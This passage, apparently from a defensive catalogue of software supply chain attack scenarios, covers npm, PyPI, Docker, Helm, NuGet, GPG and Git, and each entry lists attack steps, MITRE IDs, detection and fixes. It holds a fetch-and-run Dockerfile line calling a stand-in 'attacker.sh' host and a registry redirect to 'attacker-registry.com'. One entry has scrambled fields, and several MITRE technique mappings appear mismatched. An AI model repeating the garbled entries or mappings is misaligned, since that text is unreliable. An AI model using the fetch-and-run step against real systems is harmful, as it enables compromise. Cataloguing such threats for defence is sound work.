- **Tools**: npm, .npmrc, Artifactory
- **Scenario**: A misconfigured .npmrc file causes some internal package installs to fall back to the public npm registry, enabling an attacker’s similarly named malicious package to be installed.
- **Attack Steps**: 1. Company hosts private npm registry with internal libs like @company/auth-client.2. Misconfigured .npmrc lacks scope or fallback policy.3. Attacker registers @company/auth-client on public npm.4. Dev machine or CI server tries to install it, fallback occurs, and public package is fetched.5. Malicious code inside includes token stealers.6. Executes with full access to CI env during build.7. Attacker retrieves secrets and leverages them for access into staging/prod infra.
- **Detection**: Restrict scope fallback in registry configs
- **Solution**: Pin internal dependencies and disable fallback completely
- **Tags**: npm, Internal Registry, Confusion

## Exploiting Lenient Dependency Versioning in Python Projects

- **Attack Type**: Malicious Libraries
- **Target**: Python Projects
- **Vulnerability**: Use of non-namespaced/internal packages
- **MITRE**: T1195.002 – Supply Chain Compromise
- **Impact**: Stolen credentials, possible lateral movement
- **Tools**: PyPI, pip, custom Python script
- **Scenario**: An attacker uploads a backdoored version of an internal package with a slightly higher version number to PyPI.
- **Attack Steps**: 1. The attacker analyzes a company's internal repo and finds it references a non-public package like internal-utils==2.1.0. 2. The attacker publishes a malicious version to PyPI as internal-utils==2.1.1. 3. Due to lenient versioning or mistaken pip install, the public (malicious) version gets installed during CI/CD build. 4. The malicious version includes code that exfiltrates AWS keys on import. 5. Once deployed, the attacker's payload executes silently during application runtime.
- **Detection**: Monitor package versions and installation logs
- **Solution**: Use strict internal namespace & configure pip to disallow external fallback
- **Tags**: #Python #PyPI #DependencyConfusion #CI #VersionHijack

## Dependency Chain Attack via Transitive Go Modules

- **Attack Type**: Transitive Dependency Manipulation
- **Target**: Go Applications
- **Vulnerability**: Transitive dependency injection
- **MITRE**: T1195.002 – Supply Chain Compromise
- **Impact**: Remote command execution, lateral infrastructure compromise
- **Tools**: Go Modules, Go Proxy, GitHub
- **Scenario**: Compromise occurs when a deep nested Go module dependency introduces a hidden malicious import.
- **Attack Steps**: 1. The attacker forks a popular Go module (utils-core) and adds a new dependency (go-malicious) with malicious code. 2. The fork is merged or indirectly included through a PR to another module (cli-helper) used by the target. 3. The target project uses cli-helper, unaware it now includes go-malicious. 4. During go build, the malicious code is compiled into the final binary. 5. The injected code creates a reverse shell when the program is executed in production. 6. The compromise remains unnoticed as the change is buried in transitive dependencies.
- **Detection**: SBOM comparison & binary diffing
- **Solution**: Regularly audit full dependency graph & verify imported modules
- **Tags**: #GoLang #TransitiveAttack #SupplyChain #BinaryBackdoor

## Trojanizing a Popular PHP Composer Package

- **Attack Type**: Malicious Libraries
- **Target**: PHP Web Apps
- **Vulnerability**: Maintainer trust and lack of code review
- **MITRE**: T1554 – Compromise Software Supply Chain
- **Impact**: Secret leakage, full DB compromise
- **Tools**: Composer, Packagist, PHP
- **Scenario**: A malicious contributor uploads a tainted version of a PHP package to Packagist.
- **Attack Steps**: 1. Attacker identifies a widely used package on Packagist with lax maintainer controls. 2. Submits a PR adding "minor" logging utility, which hides credential exfiltration code. 3. PR is approved due to lack of review and uploaded to Packagist. 4. Websites using the package for auth or database management begin leaking env variables. 5. Attacker collects .env keys using their hosted endpoint. 6. Maintainers are unaware until logs reveal unusual outbound connections.
- **Detection**: Outbound DNS/HTTP anomaly monitoring
- **Solution**: Mandatory peer-review & integrity scanning before merge
- **Tags**: #PHP #Composer #CredentialLeak #SupplyChainRisk

## CI/CD Poisoning via .npmrc Injection

- **Attack Type**: Build Configuration Abuse
- **Target**: Node.js Pipelines
- **Vulnerability**: CI build misconfiguration
- **MITRE**: T1059 – Command and Scripting Interpreter
- **Impact**: Full remote control over production backend
- **Tools**: npm, GitHub Actions, Node.js
- **Scenario**: Malicious .npmrc file alters install behavior to pull packages from attacker's registry.
- **Attack Steps**: 1. Attacker submits a PR to a public GitHub repo that includes a hidden .npmrc file. 2. This file sets the default registry to https://attacker-registry.com. 3. The CI/CD pipeline installs dependencies using this registry unknowingly. 4. Attacker hosts trojaned versions of real dependencies on the fake registry. 5. Build artifacts include malicious code, and attacker gains control over deployed backend services. 6. Exploit goes unnoticed due to trust in CI pipeline and lack of file monitoring.
- **Detection**: Monitor registry source in builds
- **Solution**: Enforce internal registry only & audit incoming PR files
- **Tags**: #npmrc #CI/CD #NodeJS #BuildPoisoning

## DLL Hijacking via Python Wheel on TestPyPI

- **Attack Type**: Binary-Level Backdoor
- **Target**: Windows-based Python Systems
- **Vulnerability**: DLL path loading vulnerability
- **MITRE**: T1574.001 – DLL Search Order Hijacking
- **Impact**: In-memory token theft, persistent access
- **Tools**: Python, TestPyPI, PE-bear
- **Scenario**: Malicious wheel installs a DLL that hijacks imports in the host system.
- **Attack Steps**: 1. Attacker publishes a new package to TestPyPI under a name resembling a private wheel. 2. This package bundles a DLL named similarly to sqlite3.dll, placed in a path likely to be loaded first. 3. During pip install, the DLL gets installed to site-packages. 4. When the application imports sqlite3, the malicious DLL is loaded instead. 5. The DLL steals tokens from memory and uploads to C2. 6. Since the attack happens post-installation, static scanners fail to detect it.
- **Detection**: File integrity + memory behavior monitoring
- **Solution**: Use wheel verification & disable external sources in pip
- **Tags**: #Python #DLLHijack #TestPyPI #SupplyChain

## Hijacking Pre/Post-Install Scripts in npm

- **Attack Type**: Malicious Libraries
- **Target**: Node.js Projects
- **Vulnerability**: Unsafe use of preinstall lifecycle scripts
- **MITRE**: T1546.003 – Logon Script Execution
- **Impact**: Container breakout, remote shell access
- **Tools**: npm, Node.js, HTTP server
- **Scenario**: The attacker uses lifecycle hooks in package.json to execute remote payloads.
- **Attack Steps**: 1. The attacker publishes a package like color-helper that includes a hidden preinstall script. 2. This script downloads and executes a Node.js payload from the attacker’s server. 3. Developer unknowingly installs it as a sub-dependency. 4. During install, the payload executes, creating a reverse shell. 5. This happens before any runtime, so even unused packages trigger the compromise. 6. Attacker gets shell access and uses it for privilege escalation within the CI container.
- **Detection**: Monitor install hooks and process spawning
- **Solution**: Block network calls in preinstall/postinstall, scan scripts
- **Tags**: #npm #Preinstall #LifecycleHook #NodeSecurity

## Typosquatting .whl on PyPI with Similar Name

- **Attack Type**: Typosquatting
- **Target**: Python Developers
- **Vulnerability**: Typosquatting via similar-named packages
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Credential exfiltration, build poisoning
- **Tools**: PyPI, pip, wheel tool
- **Scenario**: Attacker publishes a .whl with similar name like requets instead of requests.
- **Attack Steps**: 1. Attacker observes common typo patterns in downloads (e.g., requets). 2. Publishes requets with a valid-looking setup.py and .whl file. 3. Inside the wheel, includes a payload that runs on install using setup hooks. 4. Payload steals SSH keys and writes them to an attacker-controlled S3 bucket. 5. Due to copy-paste errors or CI autocomplete, developers install the wrong library. 6. Compromise spreads in internal builds if requirements.txt uses the typoed name.
- **Detection**: Monitor for package name anomalies
- **Solution**: Use private mirror, audit all external dependency names
- **Tags**: #PyPI #Typosquatting #Wheel #SSHLeak

## Build Step Backdoor in Dockerized Build System

- **Attack Type**: CI/CD Environment Exploit
- **Target**: bash` line after dependencies install. 3. During CI build, this step silently executes and injects a trojan in the resulting container. 4. Final image is pushed to registry and used across staging/production. 5. Attacker uses the backdoor for lateral movement or to implant data-stealing malware. 6. Developers miss this as Dockerfile diffs are too long or complex.
- **Vulnerability**: CI/CD Pipelines
- **MITRE**: Lack of build script code review
- **Impact**: T1609 – Container Administration Command
- **Tools**: Docker, GitHub Actions, curl
- **Scenario**: Attacker adds malicious step in Dockerfile that executes only during CI build time.
- **Attack Steps**: 1. A PR includes a benign-looking update to Dockerfile used in CI. 2. Attacker adds a `RUN curl attacker.sh
- **Detection**: Full container compromise, persistent backdoor
- **Solution**: Review Dockerfile diffs and builds logs
- **Tags**: Enforce multi-sig PR review for Dockerfile, hash final image

## Supply Chain Attack via Abandoned Repository Takeover

- **Attack Type**: Maintainer Identity Hijack
- **Target**: JavaScript Ecosystem
- **Vulnerability**: Abandoned project with expired domain
- **MITRE**: T1584.004 – Compromise Infrastructure
- **Impact**: Cloud key theft, telemetry collection
- **Tools**: GitHub, npm, Whois
- **Scenario**: Attacker reclaims an abandoned library’s domain, resets its repo credentials, and uploads malicious versions.
- **Attack Steps**: 1. Attacker finds a package on npm with no updates for years. 2. Finds that the domain in the maintainer’s email is expired. 3. Registers the domain and resets the email for package account. 4. Logs into the package manager and uploads new malicious versions. 5. These are auto-installed in thousands of apps depending on version ranges like ^1.2.0. 6. Payload steals cloud secrets and reports system info to attacker.
- **Detection**: Watch for reactivations of dormant packages
- **Solution**: Monitor domain expiration & transfer control to trusted accounts
- **Tags**: #npm #DomainTakeover #AbandonedPackage #RepoHijack

## Exploiting GitHub Template Repos for Default Malware

- **Attack Type**: Developer Onboarding Vector
- **Target**: GitHub Repos
- **Vulnerability**: Hidden scripts in onboarding templates
- **MITRE**: T1204.002 – Malicious File
- **Impact**: Crypto mining, developer endpoint compromise
- **Tools**: GitHub, Git, Bash script
- **Scenario**: Attacker forks GitHub template repos and injects startup malware that spreads with every new project.
- **Attack Steps**: 1. Attacker forks a popular GitHub template (e.g., node-api-starter). 2. Adds a .bashrc payload that launches a crypto miner. 3. New developers clone and use the template without checking hidden files. 4. On first shell session, the payload runs and installs background processes. 5. Hundreds of projects get infected as template reuse spreads. 6. CPU usage spikes and detection happens only after cloud cost alert triggers.
- **Detection**: Monitor new background processes and high CPU
- **Solution**: Vet all templates, block unauthorized forks, scan for hidden files
- **Tags**: #GitHubTemplate #CryptoMiner #DevMalware #HiddenScripts

## Compromise of Container Registry

- **Attack Type**: Registry Poisoning
- **Target**: CI/CD pipelines
- **Vulnerability**: Unauthenticated registry usage
- **MITRE**: T1525
- **Impact**: Unauthorized remote access, data theft, potential full server compromise
- **Tools**: Docker Hub, Docker CLI, Trivy
- **Scenario**: An attacker pushes a backdoored container image to a private or public container registry used by the target CI/CD pipeline.
- **Attack Steps**: 1. Attacker creates a malicious Docker image with a reverse shell or credential-stealing binary.2. Tags the image with a name matching the legitimate one used in the target’s pipeline (e.g., myorg/backend:latest).3. Pushes it to a public registry if the target pipeline mistakenly pulls from it.4. The CI/CD pipeline pulls this image during a build or deploy phase.5. When the container runs in production, the malicious payload activates, granting the attacker access to the environment.
- **Detection**: Monitor image hash mismatches; use admission controllers
- **Solution**: Configure registries to use private, verified images only; sign and scan images
- **Tags**: container, docker, devsecops, registry, image-backdoor

## Subversion of Software Bill of Materials (SBOM)

- **Attack Type**: SBOM Tampering
- **Target**: Software consumers
- **Vulnerability**: Trust in generated SBOM
- **MITRE**: T1608.003
- **Impact**: Downstream users rely on false metadata, enabling hidden exploitation of vulnerable code
- **Tools**: Syft, Grype, yq
- **Scenario**: Attacker alters the SBOM file to hide the presence of a known vulnerable or malicious component, tricking downstream users.
- **Attack Steps**: 1. Attacker gains access to the code repository or CI/CD system generating the SBOM.2. Manually edits the SBOM (e.g., sbom.json or sbom.xml) to remove or rename vulnerable packages.3. Commits or injects the tampered SBOM into the release pipeline.4. Downstream consumers or auditors review the SBOM and see no threats.5. The malicious package remains hidden during scans, allowing it to be deployed to production environments.
- **Detection**: Detect SBOM discrepancies with independent generation tools
- **Solution**: Store SBOM in tamper-proof locations; generate SBOMs from trusted and immutable artifacts
- **Tags**: sbom, metadata, ci/cd, deception

## Abuse of Python Wheel Preinstall Script

- **Attack Type**: Malicious Build Hook
- **Target**: Developer machine
- **Vulnerability**: Preinstall script execution
- **MITRE**: T1059.006
- **Impact**: Remote code execution on developer systems
- **Tools**: Custom Python wheel, pip
- **Scenario**: A malicious actor embeds a preinstall script inside a .whl file that gets executed upon pip installation.
- **Attack Steps**: 1. Attacker creates a Python package and modifies the setup.py to include a preinstall script (cmdclass, install hook) that runs arbitrary code.2. Builds the package into a .whl file and uploads it to a public/private repository.3. A developer or pipeline installs the wheel using pip install mypackage.whl.4. During installation, the preinstall script executes and plants malware (e.g., steals SSH keys or modifies system configs).5. Since .whl files are binaries, static inspection is harder, making detection less likely.
- **Detection**: Monitor pip logs and audit wheel contents
- **Solution**: Disallow installation from unverified wheel files; restrict pip install with strict version pinning
- **Tags**: python, pip, wheel, build-hook, malware

## Compromised Git LFS Objects

- **Attack Type**: Artifact Injection
- **Target**: Open source repo
- **Vulnerability**: Git LFS pointer trust
- **MITRE**: T1608.001
- **Impact**: Hidden malware gets embedded into trusted model or binary downloads
- **Tools**: Git LFS, Git CLI
- **Scenario**: Attacker uploads malicious Git LFS (Large File Storage) binaries to override trusted large files in the repo.
- **Attack Steps**: 1. Attacker forks a repository that uses Git LFS to manage large files (e.g., machine learning models, executables).2. Replaces a .gitattributes-tracked file (like model.h5) with a malicious version.3. Pushes the changes to the fork and opens a pull request.4. If the maintainers accept the PR without validating LFS pointers, the malicious object becomes part of the project.5. End users or automated pipelines using LFS fetch the malicious object, executing it during runtime.
- **Detection**: Audit Git LFS pointer hashes against known-good hashes
- **Solution**: Always verify LFS object hashes; enforce manual review for LFS-linked content
- **Tags**: git-lfs, ml, pointer-abuse, repo-supply

## Dependency Confusion via Transitive Internal Imports

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipeline
- **Vulnerability**: Misconfigured package source prioritization
- **MITRE**: T1195.002
- **Impact**: Attackers gain control during builds or installs through false packages
- **Tools**: npm, yarn, PyPI, package managers
- **Scenario**: Malicious actor exploits a transitive internal module not published publicly but referenced via an ambiguous name.
- **Attack Steps**: 1. Attacker scans for internal package references in open-source code (e.g., @org/utils).2. Registers a public package with the same name on the respective registry.3. Targets companies that accidentally allow pulling from public registries before internal ones.4. CI/CD pipeline or developer installs dependencies, unknowingly pulling the attacker’s version.5. Malicious payload is executed during build or runtime, leading to system compromise.
- **Detection**: Monitor install logs for unexpected packages
- **Solution**: Use scoped registries and block external resolution of internal packages
- **Tags**: dependency-confusion, registry, npm, internal

## Hijacking Code Signing Infrastructure

- **Attack Type**: Signing Infrastructure Compromise
- **Target**: Software update infra
- **Vulnerability**: Private key exposure
- **MITRE**: T1608.002
- **Impact**: Signed malware reaches users, bypassing security controls
- **Tools**: Signtool, GPG, Yubikey, HSMs
- **Scenario**: Attacker breaches the code-signing infrastructure and signs malicious software as if it were legitimate.
- **Attack Steps**: 1. Attacker gains access to the organization’s signing machine or private keys stored insecurely (e.g., in CI/CD env vars or flat files).2. Builds malicious software or modifies existing binaries.3. Uses the stolen key to sign the binary, making it appear legitimate.4. Uploads signed binaries to the release pipeline or update server.5. End users and automated systems trust and execute the binary without suspicion.
- **Detection**: Check signing timestamp anomalies and verify key access
- **Solution**: Use HSMs, hardware tokens, and audit signing access; rotate keys regularly
- **Tags**: code-signing, key-theft, gpg, ci/cd

## Replacing Public Binaries in Vendor Packages

- **Attack Type**: Binary Replacement in Vendor Libs
- **Target**: Developer system
- **Vulnerability**: Unverified runtime download from public URL
- **MITRE**: T1195.001
- **Impact**: Environment compromise through trusted vendor’s indirect dependencies
- **Tools**: wget, curl, MITMproxy
- **Scenario**: A widely used vendor package contains an externally hosted binary (e.g., from a CDN) that an attacker replaces by compromising the host.
- **Attack Steps**: 1. Attacker identifies a popular vendor package that downloads a binary at runtime from a URL (e.g., https://example.com/tool.zip).2. Gains access to the hosting server (via web vuln or expired domain takeover).3. Replaces the hosted binary with a malicious one (e.g., with spyware or reverse shell).4. Developer or CI/CD pipeline installs the package and triggers the download.5. Malicious binary is fetched and run, compromising the environment.
- **Detection**: Monitor network requests during build
- **Solution**: Use packages with vendored binaries; avoid unverified third-party downloads
- **Tags**: external-binary, mitm, vendor-risk

## Tampering with NuGet Package Metadata

- **Attack Type**: Metadata Manipulation
- **Target**: .NET dev teams
- **Vulnerability**: Trust based on metadata fields
- **MITRE**: T1608
- **Impact**: Developers may install malicious packages based on fake metadata
- **Tools**: NuGet CLI, .nuspec editor
- **Scenario**: Malicious actor alters metadata in a NuGet package to deceive consumers, such as falsifying author, project link, or license info.
- **Attack Steps**: 1. Attacker creates a malicious NuGet package with a trustworthy name (e.g., Company.Logging).2. Fakes metadata fields such as Author (Company Inc.), License (MIT), and Project URL (linking to real repo).3. Uploads it to nuget.org where automated systems or developers fetch it.4. During build or dependency resolution, the package is installed, executing malicious scripts.5. Trust is gained through deceptive metadata, bypassing superficial review.
- **Detection**: Use metadata validation tools and verify publisher history
- **Solution**: Strictly verify publisher identity and use internal mirrors for critical packages
- **Tags**: nuget, metadata, dotnet, tampering

## Exploiting Jenkins Shared Library Injection

- **Attack Type**: Shared Code Injection
- **Target**: Jenkins pipelines
- **Vulnerability**: Overtrusted shared library
- **MITRE**: T1554
- **Impact**: Large-scale compromise across multiple build environments
- **Tools**: Jenkins, Git, Groovy
- **Scenario**: Attacker modifies a shared Jenkins library used across multiple pipelines to insert backdoors in every consuming project.
- **Attack Steps**: 1. Attacker gains access to a shared Jenkins library repo (e.g., via exposed Git credentials).2. Modifies a commonly used function (e.g., deployApp()) to include malicious shell commands.3. Pushes the changes to the main branch.4. All Jenkins pipelines using this shared library unknowingly include the injected payload.5. When any pipeline executes, the backdoor runs, leaking secrets or opening shells.
- **Detection**: Audit recent library commits and compare pipeline output
- **Solution**: Implement strict access control; pin shared libraries to known commits
- **Tags**: jenkins, ci/cd, library-injection

## Malicious Vagrant Box Distribution

- **Attack Type**: Vagrant Image Poisoning
- **Target**: Dev/test VMs
- **Vulnerability**: Trust in public VM images
- **MITRE**: T1608.001
- **Impact**: Stealth compromise during environment provisioning
- **Tools**: Vagrant, VirtualBox, MITMproxy
- **Scenario**: Attacker uploads a malicious Vagrant box (virtual machine image) to a public Vagrant repository that gets consumed in DevOps pipelines.
- **Attack Steps**: 1. Attacker creates a Vagrant base box with embedded malware or keyloggers.2. Uploads it to Vagrant Cloud with a legitimate-sounding name (e.g., ubuntu-focal-secure).3. Developer adds this box via vagrant init and vagrant up.4. During provisioning, the malicious payload is deployed in the VM.5. If used in CI/CD for testing or sandboxing, attacker gains access to secrets or source code.
- **Detection**: Scan downloaded boxes; monitor unexpected connections
- **Solution**: Only use internally verified and signed boxes; pin versions and hash-check downloads
- **Tags**: vagrant, vm, malware, devops

## Git Hook Hijacking via Dependency Script

- **Attack Type**: Malicious Libraries
- **Target**: Developer Systems
- **Vulnerability**: Hook auto-execution via dependency install
- **MITRE**: T1205.002
- **Impact**: Codebase tampering, data exfiltration
- **Tools**: Git, npm, custom package
- **Scenario**: A malicious package modifies .git/hooks to auto-execute malicious code during commits or pushes.
- **Attack Steps**: 1. Attacker publishes an NPM package with a postinstall script. 2. Script silently creates or modifies .git/hooks/pre-commit. 3. The hook runs malicious code (e.g., data exfiltration) every time the user commits code. 4. Developers unknowingly commit regularly, triggering the malicious script. 5. Attacker collects data or executes commands without detection.
- **Detection**: Monitor .git/hooks changes in CI pipelines
- **Solution**: Restrict script permissions, disable auto-hook triggers
- **Tags**: git, hooks, npm, postinstall

## Poisoning Shared Docker Registry with Fake Image

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Pipelines
- **Vulnerability**: Misconfigured Docker image sources
- **MITRE**: T1195.002
- **Impact**: Compromised containerized workloads
- **Tools**: Docker Hub, Trivy, Docker CLI
- **Scenario**: Attacker uploads malicious Docker image using a name matching private/internal image to Docker Hub.
- **Attack Steps**: 1. Attacker identifies private image names used internally (e.g., org/webapp). 2. Uploads a fake image to Docker Hub with the same name. 3. Developer or CI tool pulls the public one due to misconfigured precedence. 4. Malicious image includes backdoors or cryptocurrency miners. 5. Gets deployed internally, compromising production environments.
- **Detection**: Compare checksums of images before deployment
- **Solution**: Use private registries exclusively, enforce image pinning
- **Tags**: docker, registry, image-confusion

## Malicious S3 Bucket in Terraform Module Source

- **Attack Type**: IaC Supply Chain
- **Target**: Cloud Infra
- **Vulnerability**: External source control in IaC
- **MITRE**: T1199
- **Impact**: Cloud infrastructure backdoors
- **Tools**: AWS S3, Terraform, tfsec
- **Scenario**: A Terraform module hosted via S3 is swapped with one pointing to attacker-controlled infrastructure.
- **Attack Steps**: 1. A public Terraform module uses an S3 bucket as its source. 2. Attacker registers the same bucket name (after it's deleted or misconfigured). 3. Attacker uploads modified version of the module with malicious IAM roles or open security groups. 4. Developer runs terraform apply, unknowingly provisioning backdoored infrastructure. 5. Infrastructure becomes accessible to attacker.
- **Detection**: Validate module signatures and bucket ownership
- **Solution**: Use verified module registries, avoid dynamic S3 sources
- **Tags**: terraform, s3, infrastructure

## Hijacking GitHub Action with Third-Party Composite Action

- **Attack Type**: CI/CD Backdoor
- **Target**: Open Source CI/CD
- **Vulnerability**: Marketplace Action abuse
- **MITRE**: T1556.001
- **Impact**: Secret exfiltration via CI logs
- **Tools**: GitHub Actions, GitHub Marketplace
- **Scenario**: Attacker publishes a composite GitHub Action that includes malicious steps, and tricks repos into using it.
- **Attack Steps**: 1. Attacker publishes a GitHub Action named generically (e.g., setup-node). 2. Adds it to GitHub Marketplace. 3. Victim project adds it to workflows due to its appearance in search. 4. Action includes malicious steps (e.g., stealing secrets via environment variables). 5. Secrets like AWS keys are exfiltrated during CI runs.
- **Detection**: Audit third-party Action code, monitor workflow outputs
- **Solution**: Use Actions from verified publishers, pin commit hashes
- **Tags**: github-actions, ci/cd, composite-actions

## Typosquatting Legit NPM Dependency in Internal Build

- **Attack Type**: Dependency Confusion
- **Target**: CI Build Systems
- **Vulnerability**: Human error in dependency declaration
- **MITRE**: T1195.002
- **Impact**: Full access to internal apps or data
- **Tools**: npm, CI tools, Node.js
- **Scenario**: Internal CI/CD build pulls malicious lodashs instead of lodash due to a small typo introduced in config.
- **Attack Steps**: 1. Attacker publishes a fake NPM package named lodashs with similar README and metadata. 2. Developer accidentally types lodashs in package.json. 3. Build system installs the malicious version. 4. Fake package contains credential-stealing or remote-shell logic. 5. Application gets compromised in staging or production.
- **Detection**: Monitor unexpected new packages in lock files
- **Solution**: Enforce lockfile integrity, peer review on new dependencies
- **Tags**: npm, typo, confusion, build

## PyPI Package with Encrypted Payload via Steganography

- **Attack Type**: Malicious Libraries
- **Target**: Developer Workstation
- **Vulnerability**: Obfuscated malware in media assets
- **MITRE**: T1027
- **Impact**: Stealth malware execution post-install
- **Tools**: PyPI, PIL, Python, base64
- **Scenario**: Malicious PyPI package contains a base64-encoded image with embedded encrypted payload, bypassing AV detection.
- **Attack Steps**: 1. Attacker publishes a PyPI package with install_requires=['Pillow']. 2. Inside the package, an image (e.g., PNG) contains encrypted payload via steganography. 3. A hidden script extracts and decrypts this payload during setup. 4. AV tools miss the payload since it is within an image. 5. Payload activates post-install to fetch more malware or perform RCE.
- **Detection**: Monitor file types and execution behavior during install
- **Solution**: Static and dynamic analysis during pre-deployment stages
- **Tags**: pypi, steganography, obfuscation

## Compromising Helm Charts with Extra Init Containers

- **Attack Type**: Kubernetes Manifest Abuse
- **Target**: Kubernetes Clusters
- **Vulnerability**: Manifest injection
- **MITRE**: T1609
- **Impact**: Full container/node compromise
- **Tools**: Helm, Kubernetes, Netcat
- **Scenario**: Attacker publishes a Helm chart with an extra initContainer that establishes a reverse shell before app starts.
- **Attack Steps**: 1. Attacker uploads a malicious version of a popular Helm chart to a public repo. 2. Adds an extra initContainer that sleeps and starts a reverse shell. 3. Unsuspecting user deploys this chart to production. 4. Init container runs before the main app starts, giving attacker shell access to the cluster node. 5. Attacker pivots into the cluster.
- **Detection**: Compare deployed manifests with known-good templates
- **Solution**: Use trusted Helm repos, enforce static manifest scanning
- **Tags**: helm, kubernetes, initcontainer

## Dependency with License Trap Causing Legal Exploitation

- **Attack Type**: Legal Supply Chain Abuse
- **Target**: OSS Projects, Orgs
- **Vulnerability**: License misrepresentation
- **MITRE**: T1195.003
- **Impact**: Legal risk, reputational damage
- **Tools**: Open Source License, SPDX Tools
- **Scenario**: A malicious library is released under a restrictive or fake license and then used to extort or threaten users.
- **Attack Steps**: 1. Attacker releases useful open-source library under restrictive or hidden terms. 2. Library is adopted widely due to its popularity. 3. After widespread use, attacker initiates legal action or demands fees citing license violations. 4. Companies forced to pay or halt builds. 5. Also affects downstream open-source projects using it.
- **Detection**: License scanning, SPDX file validation
- **Solution**: Only use OSS libraries with clear licenses, scan licenses regularly
- **Tags**: legal, license-trap, oss

## Exploiting Package Manager Proxy Caching Delay

- **Attack Type**: Dependency Confusion
- **Target**: Internal Dev Teams
- **Vulnerability**: Sync delay between upstream/downstream
- **MITRE**: T1195.002
- **Impact**: Brief window of package compromise
- **Tools**: npm, PyPI, JFrog Artifactory
- **Scenario**: Attacker exploits the delay in syncing between package proxies and main registries to serve malicious versions first.
- **Attack Steps**: 1. Attacker publishes version 1.0.3 of a legit-looking package. 2. Due to proxy caching delays, internal orgs pulling from mirrors get the attacker's version. 3. After short window, attacker deletes package from public registry. 4. But compromised version remains cached in internal mirrors. 5. Build systems pull and use poisoned package unknowingly.
- **Detection**: Monitor package diffs between mirrors and upstream
- **Solution**: Enforce checksum verification and lockfile integrity
- **Tags**: proxy-cache, mirrors, racecondition

## Malicious GPG Key Injection in Source Package

- **Attack Type**: Package Signing Abuse
- **Target**: Linux Users/Admins
- **Vulnerability**: Trust on first use (TOFU)
- **MITRE**: T1553.002
- **Impact**: System compromise via spoofed signature
- **Tools**: GPG, Debian Packages, MITM tools
- **Scenario**: Attacker provides a fake GPG-signed package using self-generated keys to appear legitimate in manual installations.
- **Attack Steps**: 1. Attacker publishes .deb or .rpm package claiming to be from a trusted vendor. 2. Uses their own GPG key but with similar name/email as real vendor. 3. Tricks users via forum post, email, or MITM to install package. 4. Package runs malicious post-install script to backdoor the system. 5. Since it is signed, many tools don’t warn users.
- **Detection**: Check GPG fingerprint manually, verify against known keys
- **Solution**: Use strict key pinning and metadata validation
- **Tags**: gpg, package, deb, signature

## Dependency Confusion via Custom PyPI in CI/CD

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Pipeline
- **Vulnerability**: Insecure dependency source configuration
- **MITRE**: T1195.002
- **Impact**: Remote Code Execution during CI builds
- **Tools**: Python, DevPi, PyPI
- **Scenario**: Attacker hosts a package on a fake internal PyPI-like repo mimicking internal names used in the target’s CI pipeline.
- **Attack Steps**: 1. Attacker identifies internal Python package names via leaked logs or package.json files in public repos. 2. Sets up a fake PyPI server using DevPi and uploads a malicious version of the same package name.3. Waits for the CI/CD pipeline to mistakenly fetch from the fake source (if --extra-index-url or no index restriction is applied).4. Malicious code runs during build.
- **Detection**: Monitor package resolution order in build logs
- **Solution**: Use strict --index-url, and pin trusted versions only
- **Tags**: python, pypi, ci/cd, dependency confusion

## Poisoning Shared Git Submodule

- **Attack Type**: Submodule Injection
- **Target**: Open-source repos
- **Vulnerability**: Trust in third-party submodules
- **MITRE**: T1195
- **Impact**: Supply chain compromise of many dependent projects
- **Tools**: GitHub, Git
- **Scenario**: Attacker adds a malicious commit to a Git submodule that is included by many open-source projects.
- **Attack Steps**: 1. Identify GitHub repositories using a shared Git submodule (e.g., via GitHub search or stars).2. Fork the submodule and push a malicious commit that looks like a legitimate update.3. Wait for projects to pull latest submodule commit or automate submodule updates via CI.4. When devs build their project, the malicious submodule code executes.
- **Detection**: Alert on unexpected submodule updates
- **Solution**: Lock submodule to specific commit hash and verify authors
- **Tags**: git, submodule, injection, source code manipulation

## Rogue Package via Typo in Dependency File

- **Attack Type**: Typosquatting
- **Target**: Developer Environment
- **Vulnerability**: Typo in package name
- **MITRE**: T1555.003
- **Impact**: Credential theft, backdoors in developer machines
- **Tools**: npm, Typosquatting tools
- **Scenario**: Dev mistypes a package like expresss instead of express in package.json, and attacker owns expresss.
- **Attack Steps**: 1. Attacker registers typosquatted package like expresss on npm.2. Malicious version includes install-time payload in preinstall hook.3. Developer unknowingly installs it due to typo.4. Code executes in developer machine or during CI.
- **Detection**: Monitor package name anomalies
- **Solution**: Use tooling to detect typos and lock versions (npm audit, lockfile-lint)
- **Tags**: npm, typosquatting, devsecops, open source

## Hijack GPG Verification in CI Artifact Publishing

- **Attack Type**: Artifact Tampering
- **Target**: CI/CD Releasers
- **Vulnerability**: Weak GPG key verification method
- **MITRE**: T1553.003
- **Impact**: Artifact compromise at build or deployment
- **Tools**: GPG, GitHub Actions
- **Scenario**: CI/CD pipeline uses GPG verification for artifacts, but the attacker uploads a matching key ID with malicious content.
- **Attack Steps**: 1. Attacker generates a GPG key with the same Key ID or short ID of a legitimate maintainer.2. Publishes a malicious artifact signed with their fake GPG key.3. Pipeline only verifies the short key ID and accepts the fake artifact.4. Malicious artifact is released or deployed.
- **Detection**: Full key fingerprint validation
- **Solution**: Enforce full GPG key fingerprint verification instead of short IDs
- **Tags**: gpg, artifact spoofing, gpg spoof, pgp

## Compromising Binaries via Homebrew Tap Injection

- **Attack Type**: Third-party Package Manager Abuse
- **Target**: Developer Machines
- **Vulnerability**: Unsigned third-party tap usage
- **MITRE**: T1548.002
- **Impact**: Local compromise of developer systems
- **Tools**: Homebrew, Ruby Scripts
- **Scenario**: Attacker sets up a Homebrew tap with a commonly used name and tricks users into installing it.
- **Attack Steps**: 1. Attacker creates a tap repo like homebrew-security with seemingly helpful tools.2. Hosts malicious Ruby formulae that download backdoored binaries.3. Lures developers via Reddit/StackOverflow.4. When users run brew install security/tool, the binary runs post-install scripts that perform spying or persistence actions.
- **Detection**: Monitor new tap additions and audit installed formula
- **Solution**: Only allow verified taps and signed binaries
- **Tags**: homebrew, tap, macos, developer compromise

## Poisoned NuGet Library in .NET CI Workflow

- **Attack Type**: Malicious Library Injection
- **Target**: .NET CI Pipelines
- **Vulnerability**: Abused MSBuild target injection
- **MITRE**: T1505
- **Impact**: Secrets exfiltration during .NET build process
- **Tools**: NuGet, .NET, PowerShell
- **Scenario**: Attacker uploads a NuGet package with a popular name and malicious code into a public repo to target internal devs or CI builds.
- **Attack Steps**: 1. Attacker registers package with a name similar to popular internal or public package on NuGet.2. Injects malicious PowerShell execution in the .targets file.3. Developer unknowingly installs the package due to naming error.4. During build, malicious .targets code runs and sends env variables to attacker's server.
